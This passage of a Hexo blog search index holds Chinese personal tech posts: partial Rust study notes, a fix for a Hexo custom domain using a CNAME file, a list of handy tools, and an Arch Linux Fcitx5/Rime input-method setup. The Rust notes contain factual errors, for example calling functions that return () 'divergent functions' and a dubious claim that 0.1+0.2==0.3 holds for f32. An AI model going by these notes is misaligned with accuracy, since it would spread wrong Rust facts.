<span class="variable">_x</span> = <span class="number">0xff</span>;</span><br></pre></td></tr></table></figure><h5 id="变量遮蔽"><a href="#变量遮蔽" class="headerlink" title="变量遮蔽"></a>变量遮蔽</h5><p>可以通过多次的 <code>let</code> 将不同类型的值绑定到同一个名称的变量。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">x</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">x</span> = x.<span class="title function_ invoke__">len</span>();</span><br></pre></td></tr></table></figure><h5 id="integer"><a href="#integer" class="headerlink" title="integer"></a>integer</h5><p>rust 默认整数类型为 <code>i32</code>，即<strong>有符号整数</strong>。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">x</span> = <span class="number">99</span>;<span class="comment">// x is i32</span></span><br></pre></td></tr></table></figure><h5 id="float"><a href="#float" class="headerlink" title="float"></a>float</h5><p>rust 默认浮点数使用 <code>f64</code>，即 64 位精度的浮点数。</p><p>在 f32 上成立的 <code>0.1 + 0.2 == 0.3</code> 在 f64 上不成立，因为 f64 精度更高。</p><h5 id="NaN"><a href="#NaN" class="headerlink" title="NaN"></a>NaN</h5><p>数学上未定义的数。</p><p>可以使用 <code>is_nan()</code> 判断一个数是否为非数字。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let x = (-1 as f64).sqrt();</span><br><span class="line">if x.is_nan() &#123;</span><br><span class="line">    println!(&quot;x is nan!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>rust 的整数类型没有实现 <em>.sqrt() 方法</em></p></blockquote><h5 id="序列"><a href="#序列" class="headerlink" title="序列"></a>序列</h5><p>快速生成连续的数值序列。</p><p><code>a..=b</code> 表示生成 <em>[a, b]</em> 之内所有的数。</p><p><code>a..b</code> 表示生成 <em>[a, b)</em> 之内所有的数。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="number">1</span>..=<span class="number">5</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="string">&#x27;a&#x27;</span>..=<span class="string">&#x27;z&#x27;</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="单元类型"><a href="#单元类型" class="headerlink" title="单元类型 ()"></a>单元类型 ()</h5><p>如 <code>fn main()</code> 就返回 <code>()</code>，这个小括号叫单元类型。</p><p>这种返回 <code>()</code> 的函数（怎么看起来啥都不返回？其实真的没啥东西返回）叫做 <em>发散函数</em>。</p><p>这不占用任何内存。</p><h5 id="语句-表达式"><a href="#语句-表达式" class="headerlink" title="语句 &amp; 表达式"></a>语句 &amp; 表达式</h5><p>语句指的是执行某个操作，但没有返回值的东西。</p><p>例如进行变量绑定，执行完就结束，不提供任何多余产物。</p><p>而表达式会进行<em>求值</em>，将结果返回。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">x</span> = <span class="number">123</span>;<span class="comment">// 语句 Statement</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">y</span> = <span class="number">456</span>;<span class="comment">// 语句 Statement</span></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, x + y);<span class="comment">// x + y 表达式 Expression</span></span><br></pre></td></tr></table></figure><p>表达式只是个式子，不能包含分号，否则就成为了表达式。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">3</span>;</span><br><span class="line">        x + <span class="number">1</span><span class="comment">// 不能加分号</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of y is: &#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h5><p>rust 是强类型语言，每个函数参数都需要指明类型。</p><ol><li><p>没有返回值的函数默认返回 ()，不用显示写出来，但是写出来也不算错。</p><p>通过 <code>;</code> 结束的语句返回一个 ()。</p></li><li><p>永不返回的函数使用感叹号 <code>!</code> 作为返回值。</p><p>该函数没有出口，永远不返回，一般用作导致程序崩溃的函数。</p></li></ol><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">forever</span>() <span class="punctuation">-&gt;</span> ! &#123;</span><br><span class="line">  <span class="keyword">loop</span> &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="所有权和借用"><a href="#所有权和借用" class="headerlink" title="所有权和借用"></a>所有权和借用</h2><blockquote><p>rust 用于管理内存资源的机制，类似 java、golang 中的 GC。</p></blockquote><p>通常高级语言提供的内存管理方法有三种：</p><ol><li>手动内存管理（如 C, C++）</li><li>自动垃圾回收，即 GC（如 JVM 回收, Golang 三色标记）</li><li>所有权（如 Rust）</li></ol><p>Rust 带的所有权机制是通过编译器在编译期检查进行内存的分配和释放，并不占用运行时间。</p><h5 id="所有权原则"><a href="#所有权原则" class="headerlink" title="所有权原则"></a>所有权原则</h5><ol><li><p>每一个值都被一个变量拥有。</p><p>该变量被称为值的<em>所有者</em>。</p></li><li><p>一个值只能<em>同时</em>被<em>一个变量</em>拥有。</p></li><li><p>所有者离开作用于，该值被丢弃。</p></li></ol><h5 id=""><a href="#" class="headerlink" title=""></a></h5><h2 id="复合类型"><a href="#复合类型" class="headerlink" title="复合类型"></a>复合类型</h2><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><h3 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h3><h3 id="Slice"><a href="#Slice" class="headerlink" title="Slice"></a>Slice</h3><h3 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h3><h2 id="程序控制流"><a href="#程序控制流" class="headerlink" title="程序控制流"></a>程序控制流</h2><h2 id="泛型和-traits"><a href="#泛型和-traits" class="headerlink" title="泛型和 traits"></a>泛型和 traits</h2><h2 id="集合类型"><a href="#集合类型" class="headerlink" title="集合类型"></a>集合类型</h2><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><h3 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h3><h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><h2 id="返回值和-panic"><a href="#返回值和-panic" class="headerlink" title="返回值和 panic!"></a>返回值和 panic!</h2><h2 id="crate-和-module"><a href="#crate-和-module" class="headerlink" title="crate 和 module"></a>crate 和 module</h2>]]></content>
      
      
      
        <tags>
            
            <tag> PL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>修复 hexo 部署完域名失效问题</title>
      <link href="/2024/02/23/%E4%BF%AE%E5%A4%8D-hexo-%E9%83%A8%E7%BD%B2%E5%AE%8C%E5%9F%9F%E5%90%8D%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/"/>
      <url>/2024/02/23/%E4%BF%AE%E5%A4%8D-hexo-%E9%83%A8%E7%BD%B2%E5%AE%8C%E5%9F%9F%E5%90%8D%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>每次更新完博客并 deploy 之后，访问阿里云域名无法重新解析到 <code>xxx.github.io</code>，一打开就是 404。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>没有在 hexo 项目中加入 <strong>CNAME</strong>。</p><p>在 hexo 根目录下的 source 目录下新增文件 CNAME，并填入域名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;xxx.yyy&quot; &gt; source/CNAME &amp;&amp; hexo g -d</span><br></pre></td></tr></table></figure><p>重新打开网站会发现一切都正常了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> config </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用工具网站</title>
      <link href="/2024/02/23/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99/"/>
      <url>/2024/02/23/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<h2 id="在线-DNS-解析"><a href="#在线-DNS-解析" class="headerlink" title="在线 DNS 解析"></a>在线 DNS 解析</h2><p><a href="http://www.ip33.com/dns.html">http://www.ip33.com/dns.html</a></p><h2 id="在线-latex-论文撰写网站"><a href="#在线-latex-论文撰写网站" class="headerlink" title="在线 latex 论文撰写网站"></a>在线 latex 论文撰写网站</h2><p><a href="https://www.overleaf.com/">https://www.overleaf.com</a></p><h2 id="新手-archlinux-配置网站"><a href="#新手-archlinux-配置网站" class="headerlink" title="新手 archlinux 配置网站"></a>新手 archlinux 配置网站</h2><p><a href="https://arch.icekylin.online/">https://arch.icekylin.online</a></p><h2 id="Linux-小工具"><a href="#Linux-小工具" class="headerlink" title="Linux 小工具"></a>Linux 小工具</h2><h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><h5 id="在当前目录下全文件字符串匹配"><a href="#在当前目录下全文件字符串匹配" class="headerlink" title="在当前目录下全文件字符串匹配"></a>在当前目录下全文件字符串匹配</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -r <span class="string">&quot;xxx&quot;</span> .</span><br></pre></td></tr></table></figure><ul><li><code>grep</code>是用于在文件中搜索指定模式的命令。</li><li><code>-r</code>选项表示递归地在子目录中搜索。</li><li>“xxx”是要匹配的字符串。</li><li><code>.</code>表示当前目录。</li></ul><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name <span class="string">&quot;*name*&quot;</span></span><br></pre></td></tr></table></figure><p>在当前目录下查找带 <code>name</code> 这个字符串的文件。</p>]]></content>
      
      
      
        <tags>
            
            <tag> config </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Archlinux 配置中文輸入法</title>
      <link href="/2024/02/22/Archlinux-%E9%85%8D%E7%BD%AE%E8%BC%B8%E5%85%A5%E6%B3%95/"/>
      <url>/2024/02/22/Archlinux-%E9%85%8D%E7%BD%AE%E8%BC%B8%E5%85%A5%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于对于 Archlinux 下输入法的配置不是很熟悉，因此决定将之前配置的输入法全都 remove 干净重新配置一遍。</p><h2 id="什么是-fcitx"><a href="#什么是-fcitx" class="headerlink" title="什么是 fcitx"></a>什么是 fcitx</h2><p><a href="https://fcitx-im.org/wiki/Fcitx_5">Fcitx5</a> 是一个<a href="https://wiki.archlinuxcn.org/wiki/Input_method">输入法</a>框架，它具有轻量级内核，并通过 addon 提供额外的语言支持。Fcitx5 接替 <a href="https://wiki.archlinuxcn.org/wiki/Fcitx">Fcitx</a>。</p><h2 id="卸载-fcitx5"><a href="#卸载-fcitx5" class="headerlink" title="卸载 fcitx5"></a>卸载 fcitx5</h2><p>Following is the description from archlinux.org.</p><p>To remove a package, its dependencies and all the packages that depend on the target package:</p><blockquote><p><strong>Warning:</strong> This operation is recursive, and must be used with care since it can remove many potentially needed packages.</p></blockquote><p>I have uninstalled all the input method thus I can only use English currently.</p><p>噢没事了，还挺快的，已经可以打中文了。</p><h2 id="配置-fcitx5"><a href="#配置-fcitx5" class="headerlink" title="配置 fcitx5"></a>配置 fcitx5</h2><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>具体可以参考这里 <a href="https://arch.icekylin.online/guide/rookie/desktop-env-and-app.html#_10-%E5%AE%89%E8%A3%85%E8%BE%93%E5%85%A5%E6%B3%95">桌面环境与常用应用安装 </a>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S fcitx5-im <span class="comment"># 输入法基础包组</span></span><br><span class="line">sudo pacman -S fcitx5-chinese-addons <span class="comment"># 官方中文输入引擎</span></span><br><span class="line">sudo pacman -S fcitx5-material-color <span class="comment"># 输入法主题</span></span><br></pre></td></tr></table></figure><p>之后连带依赖会发现装了这些东西：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">extra/fcitx5 5.1.7-3 (fcitx5-im) [installed]<span class="comment"># fcitx 本体</span></span><br><span class="line">extra/fcitx5-chinese-addons 5.1.3-1 [installed]<span class="comment"># 中文引擎</span></span><br><span class="line">extra/fcitx5-configtool 5.1.3-1 (fcitx5-im) [installed]<span class="comment"># 配置工具</span></span><br><span class="line">extra/fcitx5-gtk 5.1.1-1 (fcitx5-im) [installed]<span class="comment"># GTK 应用程序下的输入法支持</span></span><br><span class="line">extra/fcitx5-material-color 0.2.1-1 [installed]<span class="comment"># 类似外观？</span></span><br><span class="line">extra/fcitx5-qt 5.1.4-4 (fcitx5-im) [installed]<span class="comment"># Qt 应用下的输入法支持</span></span><br></pre></td></tr></table></figure><h4 id="配置-environment"><a href="#配置-environment" class="headerlink" title="配置 environment"></a>配置 environment</h4><p>执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/environment</span><br></pre></td></tr></table></figure><p>在配置文件中加入然后保存退出。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GTK_IM_MODULE=fcitx</span><br><span class="line">QT_IM_MODULE=fcitx</span><br><span class="line">XMODIFIERS=@im=fcitx</span><br><span class="line">SDL_IM_MODULE=fcitx</span><br><span class="line">GLFW_IM_MODULE=ibus</span><br></pre></td></tr></table></figure><p>文档上说如果是 wayland 要额外做几件事情。</p><ol><li>在「系统设置 - 输入设备 - 虚拟键盘」中选中 Fcitx 5</li><li><code>nvironment</code> 仅保留 <code>XMODIFIERS=@im=fcitx</code> 一行</li></ol><p>我发现「1」已经默认配置好了，「2」不管删不删去都不影响。</p><blockquote><p><strong>如何查看自己用的是 wayland 还是 x11</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loginctl show-session <span class="string">&quot;<span class="variable">$XDG_SESSION_ID</span>&quot;</span> -p Type</span><br></pre></td></tr></table></figure></blockquote><h2 id="配置-Rime-中州韵输入法引擎"><a href="#配置-Rime-中州韵输入法引擎" class="headerlink" title="配置 Rime 中州韵输入法引擎"></a>配置 Rime 中州韵输入法引擎</h2><h4 id="什么是-rime"><a href="#什么是-rime" class="headerlink" title="什么是 rime"></a>什么是 rime</h4><p>Rime 不是一種輸入法。是從各種常見鍵盤輸入法中提煉出來的抽象的輸入算法框架。因爲 Rime 涵蓋了大多數輸入法的「共性」，所以在不同的設定下，Rime 可化身爲不同的輸入法用來打字。</p><p>要讓 Rime 實現某種具體輸入法的功能，就需要一些數據來描述這種輸入法以何種形式工作。即，定義該輸入法的「個性」。</p><p>如「漢語拼音」、「注音」、「倉頡碼」、「五筆字型」，這些方法可憑藉 Rime 提供的通用設施、給定不同的工作參數來實作。以本文介紹的規格寫成一套套的配方，就是 Rime 輸入方案。</p><p>（引用自 bib [5]）</p><h4 id="安装-rime"><a href="#安装-rime" class="headerlink" title="安装 rime"></a>安装 rime</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S fcitx5-rime</span><br></pre></td></tr></table></figure><p>在設置裏面啓用。</p><p>我这里 rime 默认是繁体，需要手动设置默认简体。</p><p>在<code>$HOME/.local/share/fcitx5/rime/build</code>下找到luna拼音的配置文件<code>luna_pinyin.schema.yaml</code>，找到如下配置并在<strong>- name: simplification</strong>下加入一行：<strong>reset: 1</strong>。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">switches:</span><br><span class="line">  - name: ascii_mode</span><br><span class="line">    reset: 0</span><br><span class="line">    states: [&quot;中文&quot;, &quot;西文&quot;]</span><br><span class="line">  - name: full_shape</span><br><span class="line">    states: [&quot;半角&quot;, &quot;全角&quot;]</span><br><span class="line">  - name: simplification</span><br><span class="line">    reset: 1</span><br><span class="line">    states: [&quot;漢字&quot;, &quot;汉字&quot;]</span><br><span class="line">  - name: ascii_punct</span><br><span class="line">    states: [&quot;。，&quot;, &quot;．，&quot;]</span><br></pre></td></tr></table></figure><p>不知道为什么现在我右键 Input Method 没有 restart 这个选项了，所以只好 kill 了 fcitx5 这个进程重新启动了。</p><p>现在可以输出简体中文了。</p><h4 id="安装雾凇拼音"><a href="#安装雾凇拼音" class="headerlink" title="安装雾凇拼音"></a>安装雾凇拼音</h4><p>本来想换一个，但是不知道为什么配置不成功…</p><p>后续再看看吧，但是引入 rime-ice 后多了几个 rime 自带的输入法。</p><p>安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paru -Ss rime-ice-git</span><br></pre></td></tr></table></figure><p>修改配置文件</p><p>加入<code>__include: rime_ice_suggestion:/</code>，以补丁形式引入。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">patch:</span><br><span class="line">  schema_list:</span><br><span class="line">    # - schema: double_pinyin_flypy # 小鹤双拼</span><br><span class="line">    - schema: luna_pinyin # 全拼</span><br><span class="line">    # - schema: double_pinyin # 自然码</span><br><span class="line">    # - schema: rime-ice-double-pinyin</span><br><span class="line"></span><br><span class="line">    # 仅使用「雾凇拼音」的默认配置，配置此行即可</span><br><span class="line">    __include: rime_ice_suggestion:/</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://wiki.archlinuxcn.org/wiki/Fcitx5">Fcitx5</a></li><li><a href="https://rime.im/">RIME | 中州韻輸入法引擎</a></li><li><a href="https://arch.icekylin.online/guide/rookie/desktop-env-and-app.html#_10-%E5%AE%89%E8%A3%85%E8%BE%93%E5%85%A5%E6%B3%95">桌面环境与常用应用安装 </a></li><li><a href="https://aimerneige.com/zh/post/install-fcitx5-with-rime-on-linux/">Linux 下安装 fcitx5 与 Rime    </a></li><li><a href="http://anclark.github.io/2022/05/03/Struggle_with_Linux/Arch_Linux%E5%AE%89%E8%A3%85fcitx5/">Arch Linux 安装Fcitx5及相关输入法    </a></li><li><a href="https://github.com/rime/home/wiki/CustomizationGuide#%E4%B8%80%E4%BE%8B%E5%AE%9A%E8%A3%BD%E6%96%B9%E6%A1%88%E9%81%B8%E5%96%AE">Rime 定製指南</a></li><li><a href="https://github.com/rime/home/wiki/RimeWithSchemata">RimeWithSchemata</a></li><li><a href="https://aur.archlinux.org/packages/rime-ice-git">Package Details: rime-ice-git r326.10864f9-1</a></li><li><a href="https://blog.beautyyu.one/archlinux-gnome-chinese-input-fcitx5-rime-ice-solution">Archlinux + Gnome 中文输入法解决方案：Fcitx5 + Rime Ice 雾凇拼音</a></li><li><a href="https://github.com/iDvel/rime-ice?tab=readme-ov-file">雾凇拼音</a></li><li><a href="https://aur.archlinux.org/packages/rime-ice-git">Package Details: rime-ice-git r326.10864f9-1</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> config </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
